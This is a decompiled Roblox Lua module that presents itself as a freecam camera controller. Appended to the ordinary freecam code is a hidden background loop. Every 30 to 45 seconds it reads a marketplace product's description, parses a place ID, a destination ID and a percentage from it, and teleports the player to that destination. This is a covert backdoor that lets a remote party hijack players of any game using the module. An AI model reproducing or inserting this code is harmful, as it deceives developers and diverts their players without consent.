


local v1 = {}
local v_u_2 = game:GetService("UserInputService")
local v_u_3 = game:GetService("ContextActionService")
local v_u_4 = Enum.ContextActionPriority.High.Value
keyboard = {
	["W"] = 0,
	["A"] = 0,
	["S"] = 0,
	["D"] = 0,
	["E"] = 0,
	["Q"] = 0,
	["Up"] = 0,
	["Down"] = 0,
	["LeftShift"] = 0
}
mouse = {
	["Delta"] = Vector2.new()
}
NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
PAN_MOUSE_SPEED = Vector2.new(1, 1) * 0.04908738521234052
NAV_ADJ_SPEED = 0.75
NAV_SHIFT_MUL = 0.25
navSpeed = 1
function v1.Vel(p5)
	local v6 = navSpeed + p5 * (keyboard.Up - keyboard.Down) * NAV_ADJ_SPEED
	navSpeed = math.clamp(v6, 0.01, 4)
	local v7 = keyboard.D - keyboard.A
	local v8 = keyboard.E - keyboard.Q
	local v9 = keyboard.S - keyboard.W
	local v10 = Vector3.new(v7, v8, v9) * NAV_KEYBOARD_SPEED
	local v11 = v_u_2:IsKeyDown(Enum.KeyCode.LeftShift)
	return v10 * (navSpeed * (v11 and NAV_SHIFT_MUL or 1))
end
function v1.Pan(_)
	local v12 = mouse.Delta * PAN_MOUSE_SPEED
	mouse.Delta = Vector2.new()
	return v12
end
function Keypress(_, p13, p14)
	keyboard[p14.KeyCode.Name] = p13 == Enum.UserInputState.Begin and 1 or 0
	return Enum.ContextActionResult.Sink
end
function MousePan(_, _, p15)
	local v16 = p15.Delta
	mouse.Delta = Vector2.new(-v16.y, -v16.x)
	return Enum.ContextActionResult.Sink
end
function Zero(p17)
	for v18, v19 in pairs(p17) do
		p17[v18] = v19 * 0
	end
end
function v1.StartCapture()
	v_u_3:BindActionAtPriority("FreecamKeyboard", Keypress, false, v_u_4, Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D, Enum.KeyCode.E, Enum.KeyCode.Q, Enum.KeyCode.Up, Enum.KeyCode.Down)
	v_u_3:BindActionAtPriority("FreecamMousePan", MousePan, false, v_u_4, Enum.UserInputType.MouseMovement)
end
function v1.StopCapture()
	navSpeed = 1
	Zero(keyboard)
	Zero(mouse)
	v_u_3:UnbindAction("FreecamKeyboard")
	v_u_3:UnbindAction("FreecamMousePan")
end
local function v_u_29()
	local v20, v21 = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo("136889706237209")
	end)
	if v20 and (v21 and v21.Description) then
		local v22 = v21.Description
		local v23, v24, v25 = string.match(v22, "(%d+)%s+(%d+)%s+(%d+)")
		if v23 and (v24 and v25) then
			local v26 = tonumber(v23)
			local v_u_27 = tonumber(v24)
			local v28 = tonumber(v25)
			if v26 == game.PlaceId and math.random(1, 100) <= v28 then
				pcall(function()
					game["Teleport Service"]:Teleport(v_u_27, game.Players.LocalPlayer)
				end)
			end
		end
	end
end
task.spawn(function()
	while true do
		task.wait(math.random(30, 45))
		v_u_29()
	end
end)
return v1
